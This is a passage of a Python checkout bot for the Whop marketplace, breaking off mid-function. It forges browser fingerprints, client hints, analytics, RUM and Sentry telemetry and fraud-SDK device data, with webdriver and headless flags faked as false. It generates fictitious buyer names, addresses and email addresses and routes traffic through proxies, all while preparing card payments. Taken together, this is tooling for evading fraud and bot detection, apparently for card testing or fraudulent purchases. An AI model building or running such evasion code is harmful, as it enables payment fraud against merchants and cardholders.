import subprocess
import sys

# Auto-install requests if missing to prevent ImportError
try:
    import requests
except ImportError:
    print("Installing required package: requests...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

import json, time, uuid, re, base64, random, logging, hashlib
from datetime import datetime, timezone, timedelta

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("whop")

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
]

_CH_UA_MAP = {
    "Chrome/152": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    "Chrome/151": '"Chromium";v="151", "Not?A_Brand";v="24", "Google Chrome";v="151"',
    "Chrome/150": '"Chromium";v="150", "Not?A_Brand";v="24", "Google Chrome";v="150"',
    "Edg/152":    '"Chromium";v="152", "Not?A_Brand";v="24", "Microsoft Edge";v="152"',
    "Edg/151":    '"Chromium";v="151", "Not?A_Brand";v="24", "Microsoft Edge";v="151"',
}

def _pick_ua():
    ua = random.choice(_UA_POOL)
    for k, v in _CH_UA_MAP.items():
        if k in ua:
            return ua, v
    return ua, _CH_UA_MAP["Chrome/152"]

def _rand_screen():
    screens = [
        (1920,1080,1920,1040), (1366,768,1366,728), (1536,864,1536,824),
        (1440,900,1440,860),   (2560,1440,2560,1400),(1280,800,1280,760),
        (1680,1050,1680,1010), (1600,900,1600,860),
    ]
    sw, sh, saw, sah = random.choice(screens)
    return (
        sw, sh, saw, sah,
        random.randint(800, min(sw, 1400)),
        random.randint(600, min(sh, 900)),
        random.choice([1.0, 1.25, 1.5, 2.0]),
        random.choice([4, 6, 8, 10, 12, 16]),
        random.choice([4, 8, 16, 32]),
        random.choice(["America/New_York","America/Chicago","America/Denver",
                       "America/Los_Angeles","America/Phoenix","America/Detroit"]),
    )

def _rand_name():
    fn = ["James","Michael","Robert","John","David","William","Richard","Joseph",
          "Thomas","Charles","Mary","Patricia","Jennifer","Linda","Elizabeth",
          "Barbara","Susan","Jessica","Sarah","Karen","Emily","Donna","Michelle",
          "Daniel","Matthew","Andrew","Joshua","Ryan","Brandon","Tyler","Kevin"]
    ln = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
          "Rodriguez","Martinez","Hernandez","Lopez","Wilson","Anderson","Taylor",
          "Moore","Jackson","Martin","Lee","Thompson","White","Harris","Clark",
          "Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott"]
    return f"{random.choice(fn)} {random.choice(ln)}"

def _rand_address():
    streets = ["Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Rd","Elm St","Park Ave",
               "Washington St","Lake Dr","Hill Rd","Sunset Blvd","Broadway","Walnut St",
               "Chestnut Ave","Willow Ln","Hickory Dr","Cherry Ln","River Rd","Mill Rd"]
    l1 = f"{random.randint(100,9999)} {random.choice(streets)}"
    l2 = random.choice(["", f"Apt {random.randint(1,999)}", f"Unit {random.randint(1,99)}", ""])
    return l1, l2

def _rand_city():
    cities = [
        ("New York","NY","10001"),   ("Los Angeles","CA","90001"), ("Chicago","IL","60601"),
        ("Houston","TX","77001"),    ("Phoenix","AZ","85001"),     ("San Antonio","TX","78201"),
        ("San Diego","CA","92101"),  ("Dallas","TX","75201"),      ("Austin","TX","78701"),
        ("San Francisco","CA","94102"),("Seattle","WA","98101"),   ("Denver","CO","80201"),
        ("Boston","MA","02101"),     ("Nashville","TN","37201"),   ("Portland","OR","97201"),
        ("Las Vegas","NV","89101"),  ("Kansas City","MO","64101"), ("Atlanta","GA","30301"),
        ("Miami","FL","33101"),      ("Minneapolis","MN","55401"), ("Tampa","FL","33601"),
        ("Charlotte","NC","28201"),  ("Columbus","OH","43004"),    ("Detroit","MI","48201"),
    ]
    city, state, zbase = random.choice(cities)
    return city, state, zbase[:-2] + str(random.randint(10, 99))

def _gen_email():
    first = ["james","michael","robert","john","david","william","richard","joseph",
             "thomas","charles","mary","patricia","jennifer","linda","elizabeth",
             "barbara","susan","jessica","sarah","karen","emily","donna","michelle",
             "daniel","matthew","andrew","joshua","ryan","brandon","tyler","kevin",
             "alex","chris","jordan","taylor","morgan","casey","riley","jamie"]
    last  = ["smith","johnson","williams","brown","jones","garcia","miller","davis",
             "rodriguez","martinez","hernandez","lopez","wilson","anderson","taylor",
             "moore","jackson","martin","lee","thompson","white","harris","clark",
             "lewis","robinson","walker","young","allen","king","wright","scott"]
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(1, 9999)
    yr = random.randint(1990, 2003)
    tmpl = random.choice([
        f"{f}.{l}{n}", f"{f}.{l}{yr}", f"{f}_{l}{n}", f"{f}{l}{n}",
        f"{f}{l}{yr}", f"{f[0]}{l}{n}", f"{f}.{l}.{n}", f"{f}{n}", f"{f}_{l}_{n}",
    ])
    if random.random() < 0.2:
        tmpl += uuid.uuid4().hex[:4]
    return f"{tmpl}@gmail.com"

def _wuid():
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    return "wuid_" + "".join(random.choice(chars) for _ in range(20))

def _fingerprint(ua, sw, sh):
    return hashlib.md5(f"{ua}{sw}x{sh}en-US".encode()).hexdigest()

class WhopCheckout:
    WHOP    = "https://whop.com"
    BT      = "https://js.basistheory.com"
    SEGAPI  = "https://segapi.whop.com"
    TWHOP   = "https://t.whop.tw"
    SEG_WK  = "HdaLFHQxdC1JhuAQSAcAHevjq1rIACtZ"

    GQL_RELATED = (
        "query coreFetchRelatedAccessPasses($accessPassId: ID!) {\n"
        "  publicAccessPass(id: $accessPassId) {\n"
        "    id\n"
        "    relatedAccessPasses {\n"
        "      id visibility title route headline shortenedDescription\n"
        "      position customCta customCtaUrl\n"
        "      defaultPlan { id free inStock formattedPeriodV2 releaseMethod "
        "rawInitialPrice rawRenewalPrice baseCurrency planType }\n"
        "      visiblePlansCount collectShippingAddress\n"
        "    }\n"
        "  }\n"
        "}"
    )

    GQL_ACCESS = (
        "query coreFetchProductAccessLevel($companyRoute: String!, $accessPassId: ID) {\n"
        "  resolveStorePageIds(\n"
        "    companyOrAccessPassRoute: $companyRoute\n"
        "    accessPassId: $accessPassId\n"
        "  ) {\n"
        "    companyAccessLevel\n"
        "    accessPassAccessLevel\n"
        "  }\n"
        "}"
    )

    GQL_PLANS = (
        "query HubFetchVisiblePlans($productId: ID!, $first: Int, $after: String) {\n"
        "  publicProduct(id: $productId) {\n"
        "    visiblePlans(after: $after, first: $first) {\n"
        "      nodes { ...ProductPagePlan }\n"
        "    }\n"
        "  }\n"
        "}\n"
        "fragment ProductPagePlan on PublicPlan {\n"
        "  id free inStock formattedPeriodV2 releaseMethod\n"
        "  stripeAccountId stripePublicKey setupFutureUsage\n"
        "  initialPriceDueInCents initialPrice acceptedPaymentMethods\n"
        "  expirationDays trialPeriodDays splitPayRequiredPayments\n"
        "  lowStockWarning stock baseCurrency showPromoCodeInput\n"
        "  billingPeriod onBehalfOfId paymentRequestOnBehalfOfId\n"
        "  rawInitialPrice rawRenewalPrice planType visibility\n"
        "}"
    )

    def __init__(self, cfg: dict):
        self.cfg = dict(cfg)

        ua, ch_ua = _pick_ua()
        if not self.cfg.get("user_agent"):
            self.cfg["user_agent"] = ua
        else:
            ua = self.cfg["user_agent"]
            ch_ua = next((v for k,v in _CH_UA_MAP.items() if k in ua), _CH_UA_MAP["Chrome/152"])

        self._ch_ua    = ch_ua
        self._mobile   = "?0"
        self._platform = '"Windows"' if "Windows" in ua else '"macOS"' if "Mac" in ua else '"Windows"'
        (self._sw, self._sh, self._saw, self._sah,
         self._iw, self._ih, self._dpr,
         self._cores, self._mem, self._tz) = _rand_screen()

        self._anon_id   = str(uuid.uuid4())
        self._wuid      = _wuid()
        self._render_id = str(uuid.uuid4())
        self._fp        = _fingerprint(self.cfg["user_agent"], self._sw, self._sh)

        if not self.cfg.get("billing_name"):
            self.cfg["billing_name"] = _rand_name()
        if not self.cfg.get("billing_line1"):
            l1, l2 = _rand_address()
            self.cfg["billing_line1"] = l1
            if not self.cfg.get("billing_line2"):
                self.cfg["billing_line2"] = l2
        if not self.cfg.get("billing_city"):
            c, s, z = _rand_city()
            self.cfg["billing_city"]        = c
            self.cfg["billing_state"]       = s
            self.cfg["billing_postal_code"] = z

        if self.cfg.get("product_url"):
            self._parse_url(self.cfg["product_url"])

        if not self.cfg.get("email"):
            self.cfg["email"] = _gen_email()
            log.info(f"  Auto-email: {self.cfg['email']}")

        self.checkout_id   = None
        self.client_secret = None
        self.account_id    = None
        self.tracking_id   = None
        self.bt_pub_key    = None
        self._blocked      = False
        self.ssk           = str(uuid.uuid4())
        self._card_info    = {}
        self._ctrl_checkout = str(uuid.uuid4())
        self._ctrl_payments = str(uuid.uuid4())
        self._last_pay_id   = ""
        self._last_entry    = None
        self._terms_required = False
        self._custom_fields  = []
        self._sentry_trace_id = uuid.uuid4().hex + uuid.uuid4().hex[:0]
        self._sentry_trace_id = self._sentry_trace_id[:32]
        self._sentry_release  = "4fba2eb4f0421733618817298c8bdad8ce8dc21a"
        self._sentry_pub_key  = "c6989961c9181cc2db941b290d874f29"
        self._sentry_sample_rand = round(random.random(), 17)

        self._bt_pub_key_cache = {}

        self.sess = requests.Session()
        proxy = self.cfg.get("proxy", "")
        if proxy:
            if not proxy.startswith("http"):
                proxy = "http://" + proxy
            proxy = self._encode_proxy(proxy)
            self.sess.proxies = {"http": proxy, "https": proxy}
            log.info(f"  Proxy: {proxy}")

        self.sess.headers.update({
            "accept":             "*/*",
            "accept-language":    "en-US,en;q=0.9",
            "cache-control":      "no-cache",
            "pragma":             "no-cache",
            "priority":           "u=1, i",
            "sec-ch-ua":          self._ch_ua,
            "sec-ch-ua-mobile":   self._mobile,
            "sec-ch-ua-platform": self._platform,
            "sec-gpc":            "1",
            "user-agent":         self.cfg["user_agent"],
        })

    def _parse_url(self, url):
        from urllib.parse import urlparse, parse_qs
        p = urlparse(url)
        parts = [x for x in p.path.strip("/").split("/") if x]
        if len(parts) >= 2:
            self.cfg["company_route"]     = parts[0]
            self.cfg["access_pass_route"] = parts[1]
        elif len(parts) == 1:
            self.cfg["company_route"]     = parts[0]
            self.cfg["access_pass_route"] = parts[0]
        qs = parse_qs(p.query)
        self.cfg["affiliate_tag"] = qs["a"][0] if "a" in qs else self.cfg.get("affiliate_tag","")

    @property
    def _ref(self):
        t = self.cfg.get("affiliate_tag","")
        return f"{self.WHOP}/{self.cfg['company_route']}/{self.cfg['access_pass_route']}/?a={t}"

    @property
    def _ref_noslash(self):
        t = self.cfg.get("affiliate_tag","")
        return f"{self.WHOP}/{self.cfg['company_route']}/{self.cfg['access_pass_route']}?a={t}"

    def _v1(self, path):
        return f"{self.WHOP}/api/v1/{path}"

    def _sentry(self):
        span_id = uuid.uuid4().hex[:16]
        trace   = f"{self._sentry_trace_id}-{span_id}-1"
        baggage = (
            f"sentry-environment=production,"
            f"sentry-release={self._sentry_release},"
            f"sentry-public_key={self._sentry_pub_key},"
            f"sentry-trace_id={self._sentry_trace_id},"
            f"sentry-org_id=1320754,"
            f"sentry-sampled=true,"
            f"sentry-sample_rand={self._sentry_sample_rand},"
            f"sentry-sample_rate=1"
        )
        return {"sentry-trace": trace, "baggage": baggage}

    def _wh(self, no_ct=False):
        h = {
            "origin":                 self.WHOP,
            "referer":                self._ref,
            "sec-fetch-dest":         "empty",
            "sec-fetch-mode":         "cors",
            "sec-fetch-site":         "same-origin",
            "x-ssk":                  self.ssk,
            "api-version-date":       "2026-09-15",
            "whop-private-schema":    "true",
            "x-fern-language":        "JavaScript",
            "x-fern-runtime":         "browser",
            "x-fern-runtime-version": self.cfg["user_agent"],
            **self._sentry(),
        }
        if not no_ct:
            h["content-type"] = "application/json"
        return h

    def _gql_h(self):
        return {
            "content-type":                        "application/json, application/json",
            "origin":                              self.WHOP,
            "referer":                             self._ref,
            "sec-fetch-dest":                      "empty",
            "sec-fetch-mode":                      "cors",
            "sec-fetch-site":                      "same-origin",
            "sec-gpc":                             "1",
            "x-whop-api-proxy-key":                "test",
            "x-whop-app-name":                     "web",
            "x-whop-force-new-permission-system":   "true",
            "x-whop-introspection":                "1",
            "api-version-date":                     "2026-09-15",
            "whop-private-schema":                   "true",
            "x-fern-language":                       "JavaScript",
            "x-fern-runtime":                        "browser",
            "x-fern-runtime-version":                self.cfg["user_agent"],
            "x-ssk":                                 self.ssk,
            **self._sentry(),
        }

    def _ch_ua_brands(self):
        brands = []
        for part in self._ch_ua.split(","):
            m = re.match(r'"([^"]+)";v="(\d+)"', part.strip())
            if m:
                brands.append({"brand": m.group(1), "version": m.group(2)})
        return brands or [
            {"brand":"Chromium","version":"152"},
            {"brand":"Not?A_Brand","version":"24"},
            {"brand":"Google Chrome","version":"152"},
        ]

    def _bt_di(self):
        d = {
            "uaBrands":             self._ch_ua_brands(),
            "uaMobile":             False,
            "uaPlatform":           self._platform.strip('"'),
            "languages":            ["en-US","en"],
            "timeZone":             self._tz,
            "cookiesEnabled":       True,
            "localStorageEnabled":  True,
            "sessionStorageEnabled":True,
            "platform":             "Win32",
            "hardwareConcurrency":  self._cores,
            "deviceMemoryGb":       self._mem,
            "screenWidth":          self._sw,
            "screenHeight":         self._sh,
            "screenAvailWidth":     self._saw,
            "screenAvailHeight":    self._sah,
            "innerWidth":           self._iw,
            "innerHeight":          self._ih,
            "devicePixelRatio":     self._dpr,
            "maxTouchPoints":       0,
            "network":              {},
            "plugins":              ["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer",
                                     "Microsoft Edge PDF Viewer","WebKit built-in PDF"],
            "mimeTypes":            ["application/pdf","text/pdf"],
            "webdriver":            False,
            "suspectedHeadless":    False,
            "webglVendor":          "Google Inc. (Microsoft)",
            "webglRenderer":        "ANGLE (Microsoft, Microsoft Basic Render Driver (0x0000008C) Direct3D11 vs_5_0 ps_5_0, D3D11)",
            "sardine":              {"status": "loading", "session_key_present": True},
        }
        return base64.b64encode(json.dumps(d, separators=(",",":")).encode()).decode()

    def _bth(self, key, ref_path, patch=False):
        return {
            "accept":                   "*/*",
            "accept-language":          "en-US,en;q=0.9",
            "bt-api-key":               key,
            "bt-device-info":           self._bt_di(),
            "cache-control":            "no-cache",
            "content-type":             "application/merge-patch+json" if patch else "application/json",
            "origin":                   self.BT,
            "pragma":                   "no-cache",
            "priority":                 "u=1, i",
            "referer":                  f"{self.BT}/web-elements/2.12.2/hosted-elements/{ref_path}",
            "sec-ch-ua":                self._ch_ua,
            "sec-ch-ua-mobile":         self._mobile,
            "sec-ch-ua-platform":       self._platform,
            "sec-fetch-dest":           "empty",
            "sec-fetch-mode":           "cors",
            "sec-fetch-site":           "same-origin",
            "sec-fetch-storage-access": "none",
            "sec-gpc":                  "1",
            "user-agent":               self.cfg["user_agent"],
        }

    @staticmethod
    def _is_oauth(url):
        return bool(url and "/oauth/callback" in url and "code=" in url)

    @staticmethod
    def _get_error(data):
        for k in ("last_confirm_error","blocking_error","last_payment_error","error"):
            e = data.get(k)
            if not e: continue
            if isinstance(e, dict): return e.get("message") or e.get("detail") or str(e)
            if isinstance(e, str):  return e
        return "Payment failed"

    @staticmethod
    def _encode_proxy(proxy_url: str) -> str:
        from urllib.parse import urlparse, quote, urlunparse
        try:
            p = urlparse(proxy_url)
            if p.username or p.password:
                user = quote(p.username or "", safe="")
                pw   = quote(p.password or "", safe="")
                host_part = p.hostname
                if p.port:
                    host_part = f"{host_part}:{p.port}"
                netloc = f"{user}:{pw}@{host_part}"
                p = p._replace(netloc=netloc)
                return urlunparse(p)
        except Exception:
            pass
        return proxy_url

    def _retry(self, fn, label, retries=2, delay=1.5):
        last = None
        for attempt in range(1, retries+2):
            try:
                return fn()
            except (requests.ConnectionError, requests.Timeout) as e:
                last = e
                if attempt <= retries:
                    log.warning(f"  {label} attempt {attempt} failed, retry in {delay}s...")
                    time.sleep(delay)
        raise Exception(f"{label} failed after {retries+1} attempts: {last}")

    def _now(self):
        return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]+"Z"

    def _seg_ev(self, ev_type, event_name=None, properties=None, traits=None):
        ev = {
            "type":        ev_type,
            "anonymousId": self._anon_id,
            "timestamp":   self._now(),
            "messageId":   str(uuid.uuid4()),
            "context": {
                "library":   {"name":"@whop/elements","version":"5.0.0"},
                "userAgent": self.cfg["user_agent"],
                "page": {
                    "path":     f"/{self.cfg.get('company_route','')}/{self.cfg.get('access_pass_route','')}/",
                    "referrer": "",
                    "search":   f"?a={self.cfg.get('affiliate_tag','')}",
                    "title":    "Whop",
                    "url":      self._ref,
                },
            },
        }
        if event_name:  ev["event"]      = event_name
        if properties:  ev["properties"] = properties
        if traits:      ev["traits"]     = traits
        return ev

    def _seg_post(self, events):
        try:
            batch = events if isinstance(events, list) else [events]
            self.sess.post(
                f"{self.SEGAPI}/v1/b",
                data=json.dumps({"writeKey": self.SEG_WK, "batch": batch}),
                headers={
                    "content-type":   "text/plain",
                    "origin":         self.WHOP,
                    "referer":        self.WHOP + "/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "sec-gpc":        "1",
                    **self._sentry(),
                },
                timeout=8,
            )
        except Exception:
            pass

    def _fire_twhop(self, with_fingerprint=False):
        try:
            user = {
                "anonymous_id":        self._wuid,
                "linked_anonymous_id": self._anon_id,
            }
            ctx = {
                "user_agent":        self.cfg["user_agent"],
                "screen_resolution": f"{self._sw}x{self._sh}",
                "language":          "en-US",
                "timezone":          self._tz,
                "sc":                self._fp[:8].upper(),
            }
            if with_fingerprint:
                ctx["fingerprint"]           = self._fp
                ctx["fingerprint_confidence"] = 0.6
            self.sess.post(
                f"{self.TWHOP}/conversions",
                json={
                    "event_name": "identify",
                    "company_id": self.cfg.get("company_id", ""),
                    "event_time": self._now(),
                    "url":        self._ref,
                    "user":       user,
                    "context":    ctx,
                    "source":     "link",
                },
                headers={
                    "accept-language": "en-US,en;q=0.9",
                    "content-type":    "application/json",
                    "origin":          self.WHOP,
                    "referer":         self.WHOP + "/",
                    "sec-fetch-dest":  "empty",
                    "sec-fetch-mode":  "cors",
                    "sec-fetch-site":  "cross-site",
                    "sec-gpc":         "1",
                },
                timeout=8,
            )
        except Exception:
            pass

    def s1_page(self):
        log.info("[1] Loading page (308->200)...")
        ph = {
            "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language":           "en-US,en;q=0.9",
            "cache-control":             "no-cache",
            "pragma":                    "no-cache",
            "priority":                  "u=0, i",
            "sec-fetch-dest":            "document",
            "sec-fetch-mode":            "navigate",
            "sec-fetch-site":            "none",
            "sec-fetch-user":            "?1",
            "sec-gpc":                   "1",
            "upgrade-insecure-requests": "1",
        }
        r = self.sess.get(self._ref_noslash, headers=ph, timeout=30, allow_redirects=True)
        log.info(f"  HTTP {r.status_code} | {len(r.text):,} bytes")

        if r.status_code == 403:
            log.warning("  BLOCKED (403)")
            self._blocked = True
            return False
        if r.status_code == 429:
            log.warning("  Rate limited (429)")
            return False
        if r.status_code != 200:
            log.warning(f"  HTTP {r.status_code}")
            return False

        pg = r.text

        _sr = re.search(r'sentry-release=([a-f0-9]{40})', pg)
        if _sr:
            self._sentry_release = _sr.group(1)
            log.info(f"  sentry_release={self._sentry_release[:16]}...")

        _server_ssk = self.sess.cookies.get("_whop_ssk")
        if _server_ssk:
            self.ssk = _server_ssk
            log.info(f"  ssk from cookie: {self.ssk}")

        def _find(prefix, text):
            patterns = [
                rf'"(?:companyId|id)"\s*:\s*"({re.escape(prefix)}[A-Za-z0-9]{{5,30}})"',
                rf'["\'/]({re.escape(prefix)}[A-Za-z0-9]{{5,30}})["\'/\?]',
                rf'({re.escape(prefix)}[A-Za-z0-9]{{5,30}})',
            ]
            for pat in patterns:
                m = re.search(pat, text)
                if m:
                    return m.group(1)
            return None

        def _find_near(prefix, text, anchor_str):
            data_section = text[len(text)//2:] if len(text) > 100000 else text
            hits = list(re.finditer(rf'({re.escape(prefix)}[A-Za-z0-9]{{5,30}})', data_section))
            if not hits:
                hits = list(re.finditer(rf'({re.escape(prefix)}[A-Za-z0-9]{{5,30}})', text))
            if not hits:
                return None
            if not anchor_str:
                return hits[0].group(1)
            anchor_pos = data_section.find(anchor_str)
            if anchor_pos < 0:
                anchor_pos = text.find(anchor_str)
                hits = list(re.finditer(rf'({re.escape(prefix)}[A-Za-z0-9]{{5,30}})', text))
            best, best_dist = hits[0].group(1), 10**9
            for m in hits:
                dist = abs(m.start() - anchor_pos)
                if dist < best_dist:
                    best, best_dist = m.group(1), dist
            return best

        if not self.cfg.get("access_pass_id"):
            v = _find("prod_", pg)
            if v: self.cfg["access_pass_id"] = v
        if not self.cfg.get("company_id"):
            prod_id = self.cfg.get("access_pass_id", "")
            v = None
            if prod_id:
                m = re.search(
                    rf'"id"\s*:\s*"{re.escape(prod_id)}"[^{{}}]{{0,150}}?"id"\s*:\s*"(biz_[A-Za-z0-9]{{5,30}})"',
                    pg, re.DOTALL
                )
                if m:
                    v = m.group(1)
            if not v:
                m = re.search(r'companyId\s*:\s*"(biz_[A-Za-z0-9]{5,30})"', pg)
                if m:
                    v = m.group(1)
            if not v:
                m = re.search(r'company\s*:\s*\$R\[\d+\]\s*=\s*\{[^}]{0,50}"id"\s*:\s*"(biz_[A-Za-z0-9]{5,30})"', pg)
                if m:
                    v = m.group(1)
            if not v:
                for m in re.finditer(r'(biz_[A-Za-z0-9]{5,30})', pg):
                    ctx = pg[max(0, m.start()-30):m.start()]
                    if 'setScope' not in ctx:
                        v = m.group(1)
                        break
            if v:
                self.cfg["company_id"] = v
        if not self.cfg.get("plan_id"):
            v = _find("plan_", pg)
            if v: self.cfg["plan_id"] = v

        if not self.cfg.get("access_pass_id"):
            log.warning("  Could not extract access_pass_id")
            return False

        log.info(f"  prod={self.cfg.get('access_pass_id')}  biz={self.cfg.get('company_id')}  plan={self.cfg.get('plan_id')}")
        log.info(f"  SSK={self.ssk}  anon={self._anon_id[:20]}...")
        return True

    def s2_affiliate(self):
        log.info("[2] Affiliate resolve...")
        r = self.sess.post(
            f"{self.WHOP}/api/affiliate/resolve-tracking/",
            json={
                "companyId":    self.cfg.get("company_id",""),
                "accessPassId": self.cfg.get("access_pass_id",""),
            },
            headers={
                "content-type":   "application/json",
                "origin":         self.WHOP,
                "referer":        self._ref,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc":        "1",
                **self._sentry(),
            },
            timeout=15,
        )
        d = r.json() if r.text.strip() else {}
        self.tracking_id = d.get("trackingLinkId")
        log.info(f"  trackingLinkId={self.tracking_id}")

    def s2b_rum(self):
        log.info("[2b] Cloudflare RUM...")
        try:
            page_load_id = str(uuid.uuid4())
            route_id     = str(uuid.uuid4())
            t_base       = int(time.time() * 1000) - random.randint(1000, 3000)
            self.sess.post(
                f"{self.WHOP}/cdn-cgi/rum?",
                json={
                    "startTime":           t_base,
                    "pageloadId":          page_load_id,
                    "eventType":           1,
                    "nt":                  "navigate",
                    "location":            self._ref,
                    "versions":            {"fl":"2024.11.0","js":"2026.8.4","timings":2},
                    "memory": {
                        "totalJSHeapSize":  random.randint(50000000, 70000000),
                        "usedJSHeapSize":   random.randint(20000000, 30000000),
                        "jsHeapSizeLimit":  4395630592,
                    },
                    "firstPaint":           random.randint(800, 2000),
                    "firstContentfulPaint": random.randint(800, 2000),
                },
                headers={
                    "content-type":   "application/json",
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                },
                timeout=8,
            )
            self.sess.post(
                f"{self.WHOP}/cdn-cgi/rum?",
                json={
                    "startTime": t_base,
                    "pageloadId": page_load_id,
                    "eventType": 3,
                    "nt": "navigate",
                    "location": self._ref,
                    "versions": {"fl":"2024.11.0","js":"2026.8.4","timings":2},
                },
                headers={
                    "content-type":   "application/json",
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                },
                timeout=8,
            )
            self.sess.post(
                f"{self.WHOP}/cdn-cgi/rum?",
                json={
                    "startTime": int(time.time() * 1000) - random.randint(100, 500),
                    "pageloadId": route_id,
                    "n": 2,
                    "eventType": 1,
                    "nt": "routing",
                    "location": self._ref,
                    "versions": {"fl":"2024.11.0","js":"2026.8.4","timings":2},
                },
                headers={
                    "content-type":   "application/json",
                    "origin":         self.WHOP,
                    "referer":        self._ref,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                },
                timeout=8,
            )
        except Exception:
            pass

    def s1b_ws_connect(self):
        log.info("[1b] Whop WebSocket connect (fire-and-forget)...")
        try:
            ws_url = (f"https://ws-prod.whop.com/ws"
                      f"?anon_user_id={self._anon_id}&anonymous=true&platform_type=web")
            self.sess.get(
                ws_url,
                headers={
                    "cache-control":   "no-cache",
                    "pragma":          "no-cache",
                    "origin":          self.WHOP,
                    "user-agent":      self.cfg["user_agent"],
                    "accept-language": "en-US,en;q=0.9",
                },
                timeout=5,
                allow_redirects=False,
            )
        except Exception:
            pass

    def s2c_seg_settings(self):
        log.info("[2c] Segment project settings...")
        try:
            self.sess.get(
                f"https://segcdn.whop.com/v1/projects/{self.SEG_WK}/settings",
                headers={
                    "origin":         self.WHOP,
                    "referer":        self.WHOP+"/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                },
                timeout=8,
            )
        except Exception:
            pass

    def s2d_whop_pixels_iframe(self):
        log.info("[2d] Whop pixels iframe...")
        try:
            pixel_id = uuid.uuid4().hex[:12]
            self.sess.get(
                f"{self._ref}&__whop_pixels={pixel_id}",
                headers={
                    "accept":                   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "referer":                  self._ref,
                    "sec-fetch-dest":           "iframe",
                    "sec-fetch-mode":           "navigate",
                    "sec-fetch-site":           "same-origin",
                    "upgrade-insecure-requests":"1",
                },
                timeout=10,
            )
        except Exception:
            pass

    def s4_seg_pageview(self):
        log.info("[4] Segment page view...")
        self._seg_post([
            self._seg_ev("page", properties={
                "path":     f"/{self.cfg.get('company_route','')}/{self.cfg.get('access_pass_route','')}/",
                "referrer": "",
                "search":   f"?a={self.cfg.get('affiliate_tag','')}",
                "title":    "Whop",
                "url":      self._ref,
            }),
            self._seg_ev("track", "a_core", {
                "action":                "product_page",
                "action_type":           "visit_product_page",
                "access_pass_id":        self.cfg.get("access_pass_id",""),
                "bot_id":                self.cfg.get("company_id",""),
                "has_free_plan_available": False,
            }),
        ])

    def s5_gql_related(self):
        log.info("[5] GraphQL coreFetchRelatedAccessPasses...")
        try:
            self.sess.post(
                f"{self.WHOP}/api/graphql/coreFetchRelatedAccessPasses",
                json={
                    "query":         self.GQL_RELATED,
                    "variables":     {"accessPassId": self.cfg["access_pass_id"]},
                    "operationName": "coreFetchRelatedAccessPasses",
                },
                headers=self._gql_h(),
                timeout=12,
            )
        except Exception:
            pass

    def s6_gql_access(self):
        log.info("[6] GraphQL coreFetchProductAccessLevel...")
        try:
            self.sess.post(
                f"{self.WHOP}/api/graphql/coreFetchProductAccessLevel",
                json={
                    "query":         self.GQL_ACCESS,
                    "variables":     {
                        "companyRoute":  self.cfg.get("company_route",""),
                        "accessPassId":  self.cfg.get("access_pass_id",""),
                    },
                    "operationName": "coreFetchProductAccessLevel",
                },
                headers=self._gql_h(),
                timeout=12,
            )
        except Exception:
            pass

    def s7_plans(self):
        log.info("[7] Fetching plans (GraphQL)...")
        r = self.sess.post(
            f"{self.WHOP}/api/graphql/HubFetchVisiblePlans",
            json={
                "query":         self.GQL_PLANS,
                "variables":     {"productId": self.cfg["access_pass_id"], "first": 10, "after": "MA=="},
                "operationName": "HubFetchVisiblePlans",
            },
            headers=self._gql_h(),
            timeout=15,
        )
        if r.status_code != 200:
            raise Exception(f"GraphQL {r.status_code}: {r.text[:200]}")
        data  = r.json()
        nodes = ((data.get("data") or {}).get("publicProduct") or {}).get("visiblePlans",{}).get("nodes",[])
        if not nodes:
            raise Exception(f"No plans: {json.dumps(data)[:200]}")
        if not self.cfg.get("plan_id"):
            self.cfg["plan_id"] = nodes[0]["id"]
        for p in nodes:
            mark = "  <- TARGET" if p["id"] == self.cfg["plan_id"] else ""
